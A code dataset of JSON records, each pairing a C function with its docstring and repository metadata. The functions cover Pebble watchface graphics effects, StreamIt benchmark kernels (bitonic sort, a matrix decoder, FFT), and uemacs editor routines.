{"docstring": "// Lens effect.\n// Added by Ron64\n// Parameters: lens focal(high byte) and object distance(low byte)\n", "func_signal": "void effect_lens(GContext* ctx,  GRect position, void* param)", "code": "{\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bd =  gbitmap_get_data(fb);\n  int bpr = gbitmap_get_bytes_per_row(fb);\n  uint8_t d,r, xCn, yCn;\n\n  xCn= position.origin.x + position.size.w /2;\n  yCn= position.origin.y + position.size.h /2;\n  d=position.size.w;\n  if (position.size.h < d)\n    d= position.size.h;\n  r= d/2; // radius of lens\n  float focal =   (int32_t)param >>8 & 0xFF;// focal point of lens\n  float obj_dis = (int32_t)param & 0xFF;//distance of object from focal point.\n  \n  for (int y = r; y >= 0; --y)\n    for (int x = r; x >= 0; --x)\n      if (x*x+y*y < r*r)\n      {\n        int Y1= my_tan(my_asin(y/focal))*obj_dis;\n        int X1= my_tan(my_asin(x/focal))*obj_dis;\n        set_pixel(bd,bpr, yCn +y, xCn +x, get_pixel(bd,bpr, yCn +Y1, xCn +X1)); \n        set_pixel(bd,bpr, yCn +y, xCn -x, get_pixel(bd,bpr, yCn +Y1, xCn -X1));\n        set_pixel(bd,bpr, yCn -y, xCn +x, get_pixel(bd,bpr, yCn -Y1, xCn +X1));\n        set_pixel(bd,bpr, yCn -y, xCn -x, get_pixel(bd,bpr, yCn -Y1, xCn -X1));\n      }\n    graphics_release_frame_buffer(ctx, fb);\n//Todo: Change to lock-up arcsin table in the future. (Currently using floating point math library that is relatively big & slow)\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/* minimax approximation to sin on [-pi/4, pi/4] with rel. err. ~= 5.5e-12 */\n", "func_signal": "float sin_core (float x)", "code": "{\n  float x4, x2;\n  x2 = x * x;\n  x4 = x2 * x2;\n  /* evaluate polynomial using a mix of Estrin's and Horner's scheme */\n  return ((2.7181216275479732e-6 * x2 - 1.9839312269456257e-4) * x4 + \n          (8.3333293048425631e-3 * x2 - 1.6666666640797048e-1)) * x2 * x + x;\n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// Find the offset of parent layer pointer  \n", "func_signal": "static uint8_t find_parent_offset()", "code": "{\n  Layer* p = layer_create(GRect(0,0,32,32));\n  Layer* l = layer_create(GRect(0,0,16,16));\n  layer_add_child(p,l);\n\n  uint8_t i=0;\n  while(i<16 && *(((Layer**)(void*)l)+i)!=p) ++i;\n\n  if(*(((Layer**)(void*)l)+i)!=p) {\n    i=0xff;\n    APP_LOG(APP_LOG_LEVEL_ERROR,\"EffectLayer library was unable to find the parent layer offset! Your app will probably crash (sorry) :(\");\n  }\n\n  layer_destroy(l);\n  layer_destroy(p);\n  return i;\n}", "path": "src\\effect_layer.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// THE EXTREMELY FAST LINE ALGORITHM Variation E (Addition Fixed Point PreCalc Small Display)\n// Small Display (256x256) resolution.\n// based on algorythm by Po-Han Lin at http://www.edepot.com\n", "func_signal": "void set_line(uint8_t *bitmap_data, int bytes_per_row, int y, int x, int y2, int x2, uint8_t draw_color, uint8_t skip_color, uint8_t *visited)", "code": "{\n  bool yLonger = false;\tint shortLen=y2-y; int longLen=x2-x;\n  uint8_t temp_pixel;  int temp_x, temp_y;\n  \n\tif (abs(shortLen)>abs(longLen)) {\n\t\tint swap=shortLen;\n\t\tshortLen=longLen;\tlongLen=swap;\tyLonger=true;\n\t}\n  \n\tint decInc;\n\tif (longLen==0) decInc=0;\n\telse decInc = (shortLen << 8) / longLen;\n\n\tif (yLonger) {\n\t\tif (longLen>0) {\n\t\t\tlongLen+=y;\n\t\t\tfor (int j=0x80+(x<<8);y<=longLen;++y) {\n        temp_y = y; temp_x = j >> 8;\n        if (temp_y >=0 && temp_y<168 && temp_x >=0 && temp_x < 144) {\n          temp_pixel = get_pixel(bitmap_data, bytes_per_row,  temp_y, temp_x);\n          #ifdef PBL_COLOR // for Basalt drawing pixel if it is not of original color or already drawn color\n            if (temp_pixel != skip_color && temp_pixel != draw_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color);\n          #else\n            if (get_pixel(visited, bytes_per_row,  temp_y, temp_x) != 1) { // for Aplite first check if pixel isn't already marked as set in user-defined array\n              if (temp_pixel != skip_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color); // if pixel isn't of original color - set it\n              draw_color = 1 - draw_color; // revers pixel for \"lined\" effect\n              set_pixel(visited, bytes_per_row, temp_y, temp_x, 1); //mark pixel as set\n            }\n          #endif\n        }\n\t\t\t\tj+=decInc;\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\tlongLen+=y;\n\t\tfor (int j=0x80+(x<<8);y>=longLen;--y) {\n      temp_y = y; temp_x = j >> 8;\n      if (temp_y >=0 && temp_y<168 && temp_x >=0 && temp_x < 144) {\n        temp_pixel = get_pixel(bitmap_data, bytes_per_row,  temp_y, temp_x);\n          #ifdef PBL_COLOR // for Basalt drawing pixel if it is not of original color or already drawn color\n            if (temp_pixel != skip_color && temp_pixel != draw_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color);\n          #else\n            if (get_pixel(visited, bytes_per_row,  temp_y, temp_x) != 1) { // for Aplite first check if pixel isn't already marked as set in user-defined array\n              if (temp_pixel != skip_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color); // if pixel isn't of original color - set it\n              draw_color = 1 - draw_color; // revers pixel for \"lined\" effect\n              set_pixel(visited, bytes_per_row, temp_y, temp_x, 1); //mark pixel as set\n            }\n          #endif\n      }\n\t\t\tj-=decInc;\n\t\t}\n\t\treturn;\t\n\t}\n\n\tif (longLen>0) {\n\t\tlongLen+=x;\n\t\tfor (int j=0x80+(y<<8);x<=longLen;++x) {\n      temp_y = j >> 8; temp_x =  x;\n      if (temp_y >=0 && temp_y<168 && temp_x >=0 && temp_x < 144) {\n        temp_pixel = get_pixel(bitmap_data, bytes_per_row, temp_y, temp_x);\n          #ifdef PBL_COLOR // for Basalt drawing pixel if it is not of original color or already drawn color\n            if (temp_pixel != skip_color && temp_pixel != draw_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color);\n          #else\n            if (get_pixel(visited, bytes_per_row,  temp_y, temp_x) != 1) { // for Aplite first check if pixel isn't already marked as set in user-defined array\n              if (temp_pixel != skip_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color); // if pixel isn't of original color - set it\n              draw_color = 1 - draw_color; // revers pixel for \"lined\" effect\n              set_pixel(visited, bytes_per_row, temp_y, temp_x, 1); //mark pixel as set\n            }\n          #endif\n      }  \n\t\t\tj+=decInc;\n\t\t}\n\t\treturn;\n\t}\n\tlongLen+=x;\n\tfor (int j=0x80+(y<<8);x>=longLen;--x) {\n\t  temp_y = j >> 8; temp_x =  x;\n    if (temp_y >=0 && temp_y<168 && temp_x >=0 && temp_x < 144) {\n      temp_pixel = get_pixel(bitmap_data, bytes_per_row, temp_y, temp_x);\n          #ifdef PBL_COLOR // for Basalt drawing pixel if it is not of original color or already drawn color\n            if (temp_pixel != skip_color && temp_pixel != draw_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color);\n          #else\n            if (get_pixel(visited, bytes_per_row,  temp_y, temp_x) != 1) { // for Aplite first check if pixel isn't already marked as set in user-defined array\n              if (temp_pixel != skip_color) set_pixel(bitmap_data, bytes_per_row, temp_y, temp_x, draw_color); // if pixel isn't of original color - set it\n              draw_color = 1 - draw_color; // revers pixel for \"lined\" effect\n              set_pixel(visited, bytes_per_row, temp_y, temp_x, 1); //mark pixel as set\n            }\n          #endif\n    }  \n\t\tj-=decInc;\n\t}\n\n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// How many days are/were in the month\n", "func_signal": "int daysInMonth(int mon, int year)", "code": "{\n    mon++; // dec = 0|12, lazily optimized\n\n    // April, June, September and November have 30 Days\n    if (mon == 4 || mon == 6 || mon == 9 || mon == 11) {\n        return 30;\n    } else if (mon == 2) {\n        // Deal with Feburary & Leap years\n        if (year % 400 == 0) {\n            return 29;\n        } else if (year % 100 == 0) {\n            return 28;\n        } else if (year % 4 == 0) {\n            return 29;\n        } else {\n            return 28;\n        }\n    } else {\n        // Most months have 31 days\n        return 31;\n    }\n}", "path": "src\\Timely.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "// mask effect.\n// see struct EffectMask for parameter description  \n", "func_signal": "void effect_mask(GContext* ctx, GRect position, void* param)", "code": "{\n  GColor temp_pixel;  \n  EffectMask *mask = (EffectMask *)param;\n\n  //drawing background - only if real color is passed\n  if (!gcolor_equal(mask->background_color, GColorClear)) {\n    graphics_context_set_fill_color(ctx, mask->background_color);\n    graphics_fill_rect(ctx, GRect(0, 0, position.size.w, position.size.h), 0, GCornerNone); \n  }  \n  \n  //if text mask is used - drawing text\n  if (mask->text) {\n     graphics_context_set_text_color(ctx, mask->mask_color);\n     graphics_draw_text(ctx, mask->text, mask->font, GRect(0, 0, position.size.w, position.size.h), mask->text_overflow, mask->text_align, NULL);\n  } else if (mask->bitmap_mask) { // othersise - bitmap mask is used - draw bimap\n     graphics_draw_bitmap_in_rect(ctx, mask->bitmap_mask, GRect(0, 0, position.size.w, position.size.h));\n  }\n    \n  //capturing framebuffer bitmap\n  GBitmap *fb = graphics_capture_frame_buffer(ctx);\n  uint8_t *bitmap_data =  gbitmap_get_data(fb);\n  int bytes_per_row = gbitmap_get_bytes_per_row(fb);\n  \n  //capturing background bitmap\n  uint8_t *bg_bitmap_data =  gbitmap_get_data(mask->bitmap_background);\n  int bg_bytes_per_row = gbitmap_get_bytes_per_row(mask->bitmap_background);\n    \n  //looping throughout layer replacing mask with bg bitmap\n  for (int y = 0; y < position.size.h; y++)\n     for (int x = 0; x < position.size.w; x++) {\n       temp_pixel = (GColor)get_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x);\n       if (gcolor_equal(temp_pixel, mask->mask_color))\n         set_pixel(bitmap_data, bytes_per_row, y + position.origin.y, x + position.origin.x, get_pixel(bg_bitmap_data, bg_bytes_per_row, y + position.origin.y, x + position.origin.x));\n  }\n  \n  graphics_release_frame_buffer(ctx, fb);\n  \n}", "path": "src\\effects.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/* relative error < 7e-12 on [-50000, 50000] */\n", "func_signal": "float my_sin (float x)", "code": "{\n  float q, t;\n  int quadrant;\n  /* Cody-Waite style argument reduction */\n  q = my_rint (x * 6.3661977236758138e-1);\n  quadrant = (int)q;\n  t = x - q * 1.5707963267923333e+00;\n  t = t - q * 2.5633441515945189e-12;\n  if (quadrant & 1) {\n    t = cos_core(t);\n  } else {\n    t = sin_core(t);\n  }\n  return (quadrant & 2) ? -t : t;\n}", "path": "src\\math.c", "repo_name": "cynorg/PebbleTimely", "stars": 75, "license": "gpl-3.0", "language": "c", "size": 4721}
{"docstring": "/** Procedure bitonicSort first produces a bitonic sequence by\n * recursively sorting its two halves in opposite directions, and then\n * calls bitonicMerge.\n **/\n", "func_signal": "void bitonicSort(int lo, int cnt, int dir)", "code": "{\n  if (cnt>1)\n    {\n      int k=cnt/2;\n      bitonicSort(lo, k, ASCENDING);\n      bitonicSort(lo+k, k, DESCENDING);\n      bitonicMerge(lo, cnt, dir);\n    }\n}", "path": "streams\\apps\\benchmarks\\bitonic-sort\\c\\bitonic_uni.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "//A is an n by n matrix, so is L\n", "func_signal": "void chold(float A[Q*N+W-1][K*N],float L[K*N][K*N],int n)", "code": "{\n  int i,j,k;\n  float sum;\n\n  for (i=0; i<n;i++) {\n    for (j=i;j<n;j++) {\n      for (sum=A[i][j],k=i-1;k>=0;k--)\n\tsum -= L[i][k]*L[j][k];\n      if (i==j) {\n\tL[j][i]=sqrt(sum);\n      }\n      else {\n\tL[j][i]=sum/L[i][i];\n\tL[i][j]=0;\n      }\n      \n    }\n  }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// Returns the number of milliseconds that have elapsed since something\n", "func_signal": "int\nticks()", "code": "{\n  struct tms t;\n  return times(&t) * 1000 / ticks_per_sec;\n}", "path": "streams\\library\\cell\\samples\\fft\\static_fused\\misc.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// pop/push n\n", "func_signal": "static void\nCombineDFT(int n, float wn_r, float wn_i, float *in, float *out)", "code": "{\n  n = n >> 1;\n\n  int i;\n  float w_r = 1;\n  float w_i = 0;\n\n  for (i = 0; i < n; i += 2) {\n    float y0_r = in[i];\n    float y0_i = in[i + 1];\n    float y1_r = in[n + i];\n    float y1_i = in[n + i + 1];\n    float y1w_r = y1_r * w_r - y1_i * w_i;\n    float y1w_i = y1_r * w_i + y1_i * w_r;\n    float w_r_next;\n    float w_i_next;\n\n    out[i] = y0_r + y1w_r;\n    out[i + 1] = y0_i + y1w_i;\n    out[n + i] = y0_r - y1w_r;\n    out[n + i + 1] = y0_i - y1w_i;\n\n    w_r_next = w_r * wn_r - w_i * wn_i;\n    w_i_next = w_r * wn_i + w_i * wn_r;\n    w_r = w_r_next;\n    w_i = w_i_next;\n  }\n}", "path": "streams\\library\\cell\\samples\\fft\\dynamic_pipeline\\work.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// pop/push n\n", "func_signal": "static void\nFFTReorderSimple(int n, float *in, float *out)", "code": "{\n  int i;\n  for (i = 0; i < n; i += 4) {\n    *out++ = in[i];\n    *out++ = in[i + 1];\n  }\n  for (i = 2; i < n; i += 4) {\n    *out++ = in[i];\n    *out++ = in[i + 1];\n  }\n}", "path": "streams\\library\\cell\\samples\\fft\\dynamic_pipeline\\work.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// This multiplies the matrix A by itself\n", "func_signal": "void SelfMult(int m, int n,float A[Q*N+W-1][K*N],float AhA[K*N][K*N])", "code": "{\n  int i,j,k;\n\n  for (i=0; i<n;i++)\n    for (j=0; j<=i ;j++)\n      {\n\tAhA[i][j]=0;\n\tfor ( k=0; k<m;k++)\n\t  AhA[i][j]+=A[k][i]*A[k][j];\n\tAhA[j][i]=AhA[i][j];\n      }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// This performes the Back substituiton\n", "func_signal": "void Backs(int n, float *v, float *u, float L[K*N][K*N])", "code": "{\n  int i,j;\n  float sum;\n  for (i=n-1;i>=0;i--){\n    sum=0;\n    for (j=i+1;j<n;j++)\n      sum+=L[j][i]*v[j];\n    v[i]=(u[i]-sum)/L[i][i];\n  }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// this funtion performes the convolution of matrix h and matrix C,\n// h is a W by K matrix of channel responses,\n// B is a W+Q-1 by K matrix of channel responses,\n// C is a Q by K matirx of Channel Signitures\n", "func_signal": "void ConvMat(float C[Q][K], float B[Q+W-1][K], float h[W][K])", "code": "{\n  int i,j,l;\n\n  for (i=0; i < K ; i++){\n    for (j=0; j < W+Q-1; j++)\n      B[j][i]=0;\n    for (j=0;j < W ;j++)\n      for (l=0;l<Q;l++)\n\tB[j+l][i]+=h[l][i]*C[j][i];\n    }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// This function performes the complete decoding.\n", "func_signal": "void Decode(float C[Q][K], float h[W][K], float *r)", "code": "{\n  float B[Q+W-1][K];\n  float A[Q*N+W-1][K*N];\n  float Ahr[K*N];\n  float AhA[K*N][K*N];\n  float L[K*N][K*N];\n  float u[K*N];\n  float v[K*N];\n  float sigma;\n  float AhAsig[n][n];\n  \n  ConvMat(C,B,h);\n \n  DelMat(B,A);\n \n  MatchFilt(m,n,r,Ahr,A);\n\n  //PrintD(n,Ahr);\n  \n\n  SelfMult(Q*N+W-1,K*N,A,AhA);\n\n  //Print2D(Q*N+W-1,K*N,A);\n\n  chold(AhA,L,n);\n\n  //Print2D(n,n,L);\n\n  Forw(n,Ahr,u,L);\n\n  Backs(n,v,u,L);\n\n  //PrintD(n,Ahr);\n\n  CompSigma(n,&sigma,v,Ahr);\n  \n  //cout<< sigma<< endl;\n\n  AddSigma(n,sigma,AhA,AhAsig);\n\n  chold(AhAsig,L,n);\n\n  Forw(n,Ahr,u,L);\n\n  Backs(n,v,u,L);\n\n  //PrintD(n,v);\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/** Main loop -- run this multiple times to get numbers **/\n", "func_signal": "doDecode()", "code": "{\n//  \tint K;\n//  \tint N;\n//  \tint Q;\n//  \tint W;\n//  \tK=2;\n//  \tN=2;\n//  \tQ=2;\n//  \tW=2;\n\tfloat h[W][K];\n\tfloat C[Q][K];\n\tfloat  r[Q*N+W-1];    \n\n\tint i,j;\n\tfloat sum=0;\t\n\n\n\tfor (i=0;i<N*Q+W-1;i++)\n\t    r[i]=i;\n\n\n\tfor (i=0;i<K;i++) {\n\t    sum+=1;\n\t    //sum=sum/7;\n\n\t    for (j=0;j<Q;j++){\n\t\tsum+=1;\n\t\tC[j][i]=sum;\n\t    }\n\n\t    for (j=0;j<W;j++){\n\t\tsum++;\n\t\th[j][i]=sum;\n\t    }\n\t}\n\n\tDecode(C,h,r);\n\tprint_string(\"done\");\n\n  return 0;\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/** Loop through array, printing out each element **/\n", "func_signal": "void print()", "code": "{\n  int i;\n  for (i = 0; i < N; i++) {\n#ifdef raw\n    print_int(a[i]);\n#else\n    printf(\"%d\\n\", a[i]);\n#endif\n  }\n}", "path": "streams\\apps\\benchmarks\\bitonic-sort\\c\\bitonic_uni.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// This performs the Forward subtituion\n", "func_signal": "void Forw(int n, float *Ahr, float *u, float L[K*N][K*N])", "code": "{\n  int i,j;\n  float sum;\n\n  for (i=0; i <n; i++){\n    sum=0;\n    for (j=0; j<i;j++)\n      sum+=L[i][j]*u[j];\n    u[i]=(Ahr[i]-sum)/L[i][i];\n  }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "//B is a Q+W-1 By K matrix\n//A is a N*Q+W-1 By N*K matrix\n", "func_signal": "void DelMat(float B[Q+W-1][K], float A[Q*N+W-1][K*N])", "code": "{\n  int i,j,l;\n  for (i=0;i<K*N;i++)\n    for (j=0;j<Q*N+W-1;j++)\n      A[j][i]=0;\n  \n  for (i=0; i <K; i++)\n    for (j=0; j<N; j++)\n      for (l=0; l<Q+W-1; l++)\n\tA[j*Q+l][i*N+j]=B[l][i];\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/** A comparator is modelled by the procedure compare, where the\n * parameter dir indicates the sorting direction. If dir is ASCENDING\n * and a[i] > a[j] is true or dir is DESCENDING and a[i] > a[j] is\n * false then a[i] and a[j] are interchanged.\n **/\n", "func_signal": "void compare(int i, int j, int dir)", "code": "{\n  if (dir==(a[i]>a[j]))\n    {\n      int h=a[i];\n      a[i]=a[j];\n      a[j]=h;\n    }\n}", "path": "streams\\apps\\benchmarks\\bitonic-sort\\c\\bitonic_uni.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/** Initialize array \"a\" with data **/\n", "func_signal": "void init()", "code": "{\n  int i;\n  for (i = 0; i < N; i++) {\n    a[i] = (N - i);\n  }\n}", "path": "streams\\apps\\benchmarks\\bitonic-sort\\c\\bitonic_uni.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// this function calculates the avarage distance between two vectors\n", "func_signal": "void CompSigma(int n,float *sigma, float *a, float *b)", "code": "{\n  int i;\n  float sum=0;\n  for (i=0; i<n;i++)\n    sum+=(a[i]-b[i])*(a[i]-b[i]);\n  *sigma=sum/n;\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/** The procedure bitonicMerge recursively sorts a bitonic sequence in\n * ascending order, if dir = ASCENDING, and in descending order\n * otherwise. The sequence to be sorted starts at index position lo,\n * the number of elements is cnt.\n **/\n", "func_signal": "void bitonicMerge(int lo, int cnt, int dir)", "code": "{\n  if (cnt>1)\n    {\n      int k=cnt/2;\n      int i;\n      for (i=lo; i<lo+k; i++)\n\tcompare(i, i+k, dir);\n      bitonicMerge(lo, k, dir);\n      bitonicMerge(lo+k, k, dir);\n    }\n}", "path": "streams\\apps\\benchmarks\\bitonic-sort\\c\\bitonic_uni.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// this does the match filtering, clear from its name!\n", "func_signal": "void MatchFilt(int m, int n, float *r, float *Ahr, float A[Q*N+W-1][K*N])", "code": "{\n  int i,j,k;\n\n  for (i=0;i<n;i++)\n    {\n      Ahr[i]=0;\n      for (j=0; j<m;j++)\n\tAhr[i]+=A[j][i]*r[j];\n    }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "// Returns the number of milliseconds that have elapsed since something\n", "func_signal": "int\nticks()", "code": "{\n  struct tms t;\n  return times(&t) * 1000 / ticks_per_sec;\n}", "path": "streams\\library\\cell\\samples\\fft\\static_pipeline\\misc.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "//Adds sigma to the diagonal elements\n", "func_signal": "void AddSigma(int n,float sigma,float AhA[K*N][K*N],float AhAsig[K*N][K*N])", "code": "{\n  int i,j;\n\n  for(i=0;i<n;i++)\n    for(j=0;j<n;j++)\n      {\n\tif (i==j) {\n\t  AhAsig[i][j]=AhA[i][j]+sigma;}\n\telse {AhAsig[i][j]=AhA[i][j];\n\t}\n      }\n}", "path": "streams\\apps\\benchmarks\\nokia\\c\\nokia_raw.c", "repo_name": "bthies/streamit", "stars": 68, "license": "None", "language": "c", "size": 70551}
{"docstring": "/*\n * Initialize all of the buffers and windows. The buffer name is passed down\n * as an argument, because the main routine may have been told to read in a\n * file by default, and we want the buffer name to be right.\n */\n", "func_signal": "void edinit(char *bname)", "code": "{\n\tstruct buffer *bp;\n\tstruct window *wp;\n\n\tbp = bfind(bname, TRUE, 0);\t/* First buffer         */\n\tblistp = bfind(\"*List*\", TRUE, BFINVS);\t/* Buffer list buffer   */\n\twp = (struct window *)malloc(sizeof(struct window));\t/* First window         */\n\tif (bp == NULL || wp == NULL || blistp == NULL)\n\t\texit(1);\n\tcurbp = bp;\t\t/* Make this current    */\n\twheadp = wp;\n\tcurwp = wp;\n\twp->w_wndp = NULL;\t/* Initialize window    */\n\twp->w_bufp = bp;\n\tbp->b_nwnd = 1;\t\t/* Displayed.           */\n\twp->w_linep = bp->b_linep;\n\twp->w_dotp = bp->b_linep;\n\twp->w_doto = 0;\n\twp->w_markp = NULL;\n\twp->w_marko = 0;\n\twp->w_toprow = 0;\n#if\tCOLOR\n\t/* initalize colors to global defaults */\n\twp->w_fcolor = gfcolor;\n\twp->w_bcolor = gbcolor;\n#endif\n\twp->w_ntrows = term.t_nrow - 1;\t/* \"-1\" for mode line.  */\n\twp->w_force = 0;\n\twp->w_flag = WFMODE | WFHARD;\t/* Full.                */\n}", "path": "main.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Set the mark in the current window to the value of \".\" in the window. No\n * errors are possible. Bound to \"M-.\".\n */\n", "func_signal": "int setmark(int f, int n)", "code": "{\n\tcurwp->w_markp = curwp->w_dotp;\n\tcurwp->w_marko = curwp->w_doto;\n\tmlwrite(\"(Mark set)\");\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/* Put a character at the current position in the current colors */\n", "func_signal": "void ibmputc(int ch)", "code": "{\n\trg.h.ah = 14;\t\t/* write char to screen with current attrs */\n\trg.h.al = ch;\n#if\tCOLOR\n\tif (dtype != CDMONO)\n\t\trg.h.bl = cfcolor;\n\telse\n\t\trg.h.bl = 0x07;\n#else\n\trg.h.bl = 0x07;\n#endif\n\tint86(0x10, &rg, &rg);\n}", "path": "ibmpc.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Swap the values of \".\" and \"mark\" in the current window. This is pretty\n * easy, bacause all of the hard work gets done by the standard routine\n * that moves the mark about. The only possible error is \"no mark\". Bound to\n * \"C-X C-X\".\n */\n", "func_signal": "int swapmark(int f, int n)", "code": "{\n\tstruct line *odotp;\n\tint odoto;\n\n\tif (curwp->w_markp == NULL) {\n\t\tmlwrite(\"No mark in this window\");\n\t\treturn FALSE;\n\t}\n\todotp = curwp->w_dotp;\n\todoto = curwp->w_doto;\n\tcurwp->w_dotp = curwp->w_markp;\n\tcurwp->w_doto = curwp->w_marko;\n\tcurwp->w_markp = odotp;\n\tcurwp->w_marko = odoto;\n\tcurwp->w_flag |= WFMOVE;\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/* getboard:\tDetect the current display adapter\n\t\tif MONO\t\tset to MONO\n\t\t   CGA\t\tset to CGA\tEGAexist = FALSE\n\t\t   EGA\t\tset to CGA\tEGAexist = TRUE\n*/\n", "func_signal": "int getboard(void)", "code": "{\n\tint type;\t\t/* board type to return */\n\n\ttype = CDCGA;\n\tint86(0x11, &rg, &rg);\n\tif ((((rg.x.ax >> 4) & 3) == 3))\n\t\ttype = CDMONO;\n\n\t/* test if EGA present */\n\trg.x.ax = 0x1200;\n\trg.x.bx = 0xff10;\n\tint86(0x10, &rg, &rg);\t/* If EGA, bh=0-1 and bl=0-3 */\n\tegaexist = !(rg.x.bx & 0xfefc);\t/* Yes, it's EGA */\n\treturn type;\n}", "path": "ibmpc.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * Scroll forward by a specified number of lines, or by a full page if no\n * argument. Bound to \"C-V\". The \"2\" in the arithmetic on the window size is\n * the overlap; this value is the default overlap value in ITS EMACS. Because\n * this zaps the top line in the display window, we have to do a hard update.\n */\n", "func_signal": "int forwpage(int f, int n)", "code": "{\n\tstruct line *lp;\n\n\tif (f == FALSE) {\n#if SCROLLCODE\n\t\tif (term.t_scroll != NULL)\n\t\t\tif (overlap == 0)\n\t\t\t\tn = curwp->w_ntrows / 3 * 2;\n\t\t\telse\n\t\t\t\tn = curwp->w_ntrows - overlap;\n\t\telse\n#endif\n\t\t\tn = curwp->w_ntrows - 2;  /* Default scroll. */\n\t\tif (n <= 0)\t/* Forget the overlap. */\n\t\t\tn = 1;\t/* If tiny window. */\n\t} else if (n < 0)\n\t\treturn backpage(f, -n);\n#if     CVMVAS\n\telse\t\t\t/* Convert from pages. */\n\t\tn *= curwp->w_ntrows;\t/* To lines. */\n#endif\n\tlp = curwp->w_linep;\n\twhile (n-- && lp != curbp->b_linep)\n\t\tlp = lforw(lp);\n\tcurwp->w_linep = lp;\n\tcurwp->w_dotp = lp;\n\tcurwp->w_doto = 0;\n#if SCROLLCODE\n\tcurwp->w_flag |= WFHARD | WFKILLS;\n#else\n\tcurwp->w_flag |= WFHARD;\n#endif\n\treturn TRUE;\n}", "path": "basic.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
{"docstring": "/*\n * tell the user that this command is illegal while we are in\n * VIEW (read-only) mode\n */\n", "func_signal": "int rdonly(void)", "code": "{\n\tTTbeep();\n\tmlwrite(\"(Key illegal in VIEW mode)\");\n\treturn FALSE;\n}", "path": "main.c", "repo_name": "snaewe/uemacs", "stars": 69, "license": "None", "language": "c", "size": 636}
